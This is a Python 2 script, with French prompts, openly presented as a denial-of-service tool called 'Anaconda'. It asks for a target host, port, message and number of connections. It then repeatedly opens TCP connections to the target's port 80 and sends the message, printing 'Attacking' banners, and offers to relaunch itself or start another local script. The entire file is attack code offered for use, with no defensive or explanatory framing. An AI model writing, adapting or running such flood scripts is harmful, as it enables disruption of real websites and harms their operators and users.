#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

#+--------------------+
#|Anaconda :          |

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

import time
import socket
import os
import sys
import string

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

print ("DDos Anaconda En prechauffe")
host=raw_input( "DDos Anaconda a fin donner lui une cible:")
port=input( "DDos Anaconda Mange Port:")
message=raw_input( "Les Dernier Mot de DDos Anaconda:")
conn=input( "Combien de Bebe Anaconda en position de combat:")
ip = socket.gethostbyname( host )
print ("[" + ip + "]")
print ( "[Ip is locked]" )
print ( "[Attacking " + host + "]" )
print ("+----------------------------+")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("|[Anaconda Attaque]         |")
    print ( "|[Anaconda Doubles Attaque]       |")
    ddos.close()
for i in range(1, conn):
    dos()
print ("+----------------------------+")
print("Un Anaconda a niquer un site")
if __name__ == "__main__":
    answer = raw_input("Voulez vous envoyer BigPappa Anaconda ?")
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        os.system(curdir+"\Deq\main.py")
        
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

